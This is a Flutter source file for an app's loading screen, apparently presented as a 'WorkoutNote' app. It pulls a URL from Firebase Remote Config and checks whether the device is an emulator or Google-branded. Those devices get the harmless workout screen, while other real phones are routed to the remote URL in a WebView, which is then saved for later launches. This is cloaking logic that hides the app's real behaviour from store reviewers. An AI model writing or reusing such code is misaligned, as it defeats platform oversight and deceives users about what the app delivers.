import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:provider/provider.dart';
import 'package:test_docker/model/firebase_config.dart';
import 'package:test_docker/page/home_page.dart';
import 'package:test_docker/page/webview_page.dart';
import 'package:test_docker/util/string_util.dart';

class LoadingPage extends StatefulWidget {
  const LoadingPage({Key? key}) : super(key: key);

  State<LoadingPage> createState() => _LoadingPageState();
}

class _LoadingPageState extends State<LoadingPage> {
  static final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
  late AndroidDeviceInfo _deviceInfo;

  @override
  void initState() {
    super.initState();
    initPlatformState();
  }

  Future<void> initPlatformState() async {
   AndroidDeviceInfo deviceInfo = await deviceInfoPlugin.androidInfo;
   setState(() {
     _deviceInfo = deviceInfo;
   });
  }

  @override
  Widget build(BuildContext context) {
    FirebaseConfig config = Provider.of<FirebaseConfig>(context, listen: true);
    start(config);
    return Container();
  }

  oneS() async {
    try {
      await OneSignal.shared.promptUserForPushNotificationPermission();
      await OneSignal.shared.setAppId("");
    } catch (e){
      print(e);
    }
  }

  start(FirebaseConfig config) async {
    oneS();
    String path = await StringUtil.getPath() ?? "";
    if (path.isEmpty){
      loadFire(config);
    } else {
      startWebView(path);
    }
  }

  loadFire(FirebaseConfig config) {
    String url = config.firebase?.getString("url") ?? "";
    config.firebase?.fetchAndActivate();
    print(url);

    String brandDevice = _deviceInfo.brand;
    bool simDevice = _deviceInfo.isPhysicalDevice;

    if (url.isEmpty || brandDevice.contains("google") || !simDevice){
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => HomePage(title: "WorkoutNote")),
      );
    } else {
      StringUtil.setPath(url);
      startWebView(url);
    }
  }

  startWebView(String url){
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (context) => WebViewPage(url: url)),
    );
  }
}
